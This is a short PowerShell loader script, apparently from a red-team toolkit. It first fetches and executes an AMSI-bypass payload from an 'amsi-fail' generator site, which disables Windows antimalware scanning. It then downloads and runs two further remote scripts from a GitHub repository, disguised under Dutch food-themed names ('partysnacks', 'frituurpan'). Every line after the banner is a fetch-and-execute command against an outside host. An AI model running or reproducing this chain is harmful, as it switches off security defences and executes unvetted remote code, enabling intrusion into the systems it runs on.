write-host "Loading..."

Function voorverwarming {
  iex((iwr https://amsi-fail.azurewebsites.net/api/Generate).content)
}

voorverwarming
iex((iwr https://raw.githubusercontent.com/justin-p/chef-vet/main/partysnacks.ps1).content)
iex((iwr https://raw.githubusercontent.com/justin-p/chef-vet/main/frituurpan.ps1).content)
